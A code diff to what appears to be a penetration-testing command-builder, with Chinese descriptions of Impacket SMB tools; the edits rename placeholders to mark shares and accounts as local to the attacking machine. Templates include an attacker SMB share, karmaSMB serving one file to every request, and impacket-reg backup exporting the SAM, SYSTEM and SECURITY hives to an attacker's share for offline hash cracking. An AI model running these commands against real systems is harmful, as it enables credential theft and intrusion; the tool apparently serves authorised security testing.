@@ -59,8 +59,8 @@ export const impacketSmbTools: Tool[] = [
       {
         id: 'smbserver-basic',
         title: '匿名 SMB 共享',
-        description: '默认监听 445 端口 (需 root)，-smb2support 支持 SMB2 客户端',
-        build: (p) => `impacket-smbserver -smb2support ${v(p.fileName, 'SHARE_NAME')} ${v(p.remotePath, 'SHARE_PATH')}`,
+        description: '默认监听 445 端口 (需 root)，-smb2support 支持 SMB2 客户端；共享名/路径复用文件名/远程路径字段 (此处指攻击机本地共享)',
+        build: (p) => `impacket-smbserver -smb2support ${v(p.fileName, 'LOCAL_SHARE_NAME')} ${v(p.remotePath, 'LOCAL_SHARE_PATH')}`,
         usage: `位置参数:
   shareName         要添加的共享名 (客户端通过 \\\\IP\\shareName 访问)
   sharePath         共享对应的本地目录路径
@@ -80,24 +80,24 @@ export const impacketSmbTools: Tool[] = [
       {
         id: 'smbserver-auth',
         title: '带认证的 SMB 共享',
-        description: '-username/-password 要求客户端认证，常用于绕过目标对匿名共享的限制',
-        build: (p) => `impacket-smbserver -smb2support -username ${v(p.username, 'USER')} -password ${q(v(p.password, 'PASSWORD'))} ${v(p.fileName, 'SHARE_NAME')} ${v(p.remotePath, 'SHARE_PATH')}`,
+        description: '-username/-password 为攻击机本地自建认证 (取"本地服务账号/口令"，与目标凭证无关)，常用于绕过目标对匿名共享的限制',
+        build: (p) => `impacket-smbserver -smb2support -username ${v(p.localUser, 'LOCAL_USER')} -password ${q(v(p.localPass, 'LOCAL_PASS'))} ${v(p.fileName, 'LOCAL_SHARE_NAME')} ${v(p.remotePath, 'LOCAL_SHARE_PATH')}`,
         usage: `位置参数:
   shareName         要添加的共享名
   sharePath         共享对应的本地目录路径
 关键参数:
-  -username USERNAME  客户端认证所需用户名
+  -username USERNAME  客户端认证所需用户名 (攻击机本地自建，非目标凭证)
   -password PASSWORD  该用户的密码 (也可用 -hashes LMHASH:NTHASH 指定哈希)
   -smb2support      启用 SMB2 支持 (实验性)
   -comment COMMENT  共享注释
   -ip/--interface-address / -port / -dropssp / -6 / -outputfile  监听与日志选项`,
-        example: 'impacket-smbserver -smb2support -username test -password test share /tmp/share',
+        example: 'impacket-smbserver -smb2support -username kaada -password kaada share /tmp/share',
       },
       {
         id: 'smbserver-port',
         title: '指定监听地址与端口',
-        description: '-ip 指定监听接口，-port 指定端口 (非 445 可免 root)',
-        build: (p) => `impacket-smbserver -smb2support -ip ${v(p.localIP, 'LHOST')} -port ${v(p.localPort, 'PORT')} ${v(p.fileName, 'SHARE_NAME')} ${v(p.remotePath, 'SHARE_PATH')}`,
+        description: '-ip 指定监听接口，-port 指定端口 (非 445 可免 root)；共享名/路径复用文件名/远程路径字段 (此处指攻击机本地共享)',
+        build: (p) => `impacket-smbserver -smb2support -ip ${v(p.localIP, 'LHOST')} -port ${v(p.localPort, 'PORT')} ${v(p.fileName, 'LOCAL_SHARE_NAME')} ${v(p.remotePath, 'LOCAL_SHARE_PATH')}`,
         usage: `位置参数:
   shareName         要添加的共享名
   sharePath         共享对应的本地目录路径
@@ -120,8 +120,8 @@ export const impacketSmbTools: Tool[] = [
       {
         id: 'karmasmb-serve',
         title: '对所有请求返回同一文件',
-        description: '无论客户端请求什么路径，均返回 pathname 的内容',
-        build: (p) => `impacket-karmaSMB -smb2support ${v(p.remotePath, 'PATHNAME')}`,
+        description: '无论客户端请求什么路径，均返回 pathname 的内容；投递文件复用远程路径字段 (此处指攻击机本地文件)',
+        build: (p) => `impacket-karmaSMB -smb2support ${v(p.remotePath, 'LOCAL_PATHNAME')}`,
         usage: `位置参数:
   pathname          要投递给 SMB 客户端的文件路径 (任何文件请求都返回其内容)
 关键参数:
@@ -136,8 +136,8 @@ export const impacketSmbTools: Tool[] = [
       {
         id: 'karmasmb-config',
         title: '按扩展名映射投递文件',
-        description: '-config 指定扩展名到文件的映射，未命中扩展名回退到位置参数文件',
-        build: (p) => `impacket-karmaSMB -smb2support -config ${v(p.fileName, 'CONFIG')} ${v(p.remotePath, 'PATHNAME')}`,
+        description: '-config 指定扩展名到文件的映射，未命中扩展名回退到位置参数文件；两个路径复用文件名/远程路径字段 (此处指攻击机本地文件)',
+        build: (p) => `impacket-karmaSMB -smb2support -config ${v(p.fileName, 'LOCAL_CONFIG')} ${v(p.remotePath, 'LOCAL_PATHNAME')}`,
         usage: `位置参数:
   pathname          默认投递的文件 (未匹配扩展名时返回)
 关键参数:
@@ -277,7 +277,7 @@ query 子命令参数:
         id: 'reg-backup',
         title: '备份 SAM/SYSTEM/SECURITY',
         description: 'backup 导出 HKLM\\SAM、HKLM\\SYSTEM、HKLM\\SECURITY 到 UNC 路径，配合 secretsdump 离线解哈希',
-        build: (p) => `impacket-reg ${buildImpacketAuth(p, { targetIp: true })} backup -o \\\\\\\\${v(p.localIP, 'LHOST')}\\\\${v(p.fileName, 'SHARE_NAME')}`,
+        build: (p) => `impacket-reg ${buildImpacketAuth(p, { targetIp: true })} backup -o \\\\\\\\${v(p.localIP, 'LHOST')}\\\\${v(p.fileName, 'LOCAL_SHARE_NAME')}`,
         usage: `backup 子命令 (特殊命令): 一次性备份 HKLM\\SAM、HKLM\\SYSTEM、HKLM\\SECURITY
   -o \\\\HOST\\share  目标系统写出注册表备份的 UNC 路径 (必填；通常指向
                     本机 smbserver 起的可写共享)
